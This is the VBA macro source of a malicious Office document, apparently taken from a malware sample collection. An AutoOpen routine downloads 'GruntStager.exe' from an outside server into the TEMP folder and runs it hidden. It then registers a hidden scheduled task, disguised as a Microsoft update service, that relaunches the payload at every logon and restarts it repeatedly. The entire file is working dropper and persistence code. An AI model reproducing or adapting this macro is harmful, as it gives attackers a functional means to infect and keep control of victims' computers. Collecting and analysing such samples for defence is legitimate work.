Attribute VB_Name = "Module1"
Sub AutoOpen()
    'Define our malicious execution
    Dim Payload As String
    Payload = "GruntStager.exe"
    Dim Server As String
    Server = "http://192.168.240.6:8000"
    Dim path As String
    path = Download(Server, Payload)
    Shell path, vbHide
    Persist (path)
End Sub
Private Function Download(Server As String, Payload As String) As String
    'Download and save the payload, then return its path...
    Dim path As String
    path = Environ("TEMP") & "\" & Payload
    Dim url As String
    url = Server & "/" & Payload

    Dim WinHttpReq
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", url, False
    WinHttpReq.Send

    If WinHttpReq.Status <> 200 Then
        Exit Function
    End If
    
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write WinHttpReq.responseBody
    oStream.SaveToFile path, 2
    oStream.Close
    Download = path
    Shell path, vbHide
End Function

Private Function Persist(Payload As String)
    'Create and execute the scheduled task...
    'Get the COM Scheduling Service and connect
    Set service = CreateObject("Schedule.Service")
    service.Connect
    
    'Get the root folder
    Dim rootFolder
    Set rootFolder = service.GetFolder("\")
    
    'Create a new task definition
    Dim taskDefinition
    Set taskDefinition = service.newTask(0)
    
    'Perform basic T1036 masquerading
    Dim regInfo
    Set regInfo = taskDefinition.RegistrationInfo
    regInfo.Description = "Microsoft Update Service"
    regInfo.Author = "Microsoft Corporation"

    'Have the task run as the compromised user
    Dim principal
    Set principal = taskDefinition.principal
    principal.LogonType = 3
    
    'Define a trigger for our service
    Dim triggers
    Set triggers = taskDefinition.triggers
    Dim trigger
    Set trigger = triggers.Create(9)
    trigger.ID = "LogonTriggerId"
    trigger.Enabled = True
    trigger.UserId = Environ("USERDOMAIN") & "\" & Environ("USERNAME")
    trigger.Delay = "PT1M"  'Delay service execution

    'Get settings
    Dim settings
    Set settings = taskDefinition.settings
    settings.Enabled = True
    settings.StartWhenAvailable = True
        
    'T1158: Hidden Files and Directories (and now services)
    settings.Hidden = True
      
    'Prevent our service from timing-out
    settings.ExecutionTimeLimit = "PT0S"
    settings.AllowHardTerminate = False
      
    'Avoid duplicate services
    settings.MultipleInstances = 2
      
    'Restart our service after 1 minute if we crash
    settings.RestartInterval = "PT1M"
      
    'Restart our service many, many... many times
    settings.RestartCount = 999
      
    'Ensure our service runs, regardless of the battery status
    settings.StopIfGoingOnBatteries = False
    settings.DisallowStartIfOnBatteries = False

    'Define our service's action
    Dim Action
    Set Action = taskDefinition.Actions.Create(0)
    Action.path = Payload

    'Register our task
    Dim task
    Set task = rootFolder.RegisterTaskDefinition("Microsoft Update Service", taskDefinition, 6, , , 3)

End Function

Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True


INQUEST-PP=macro
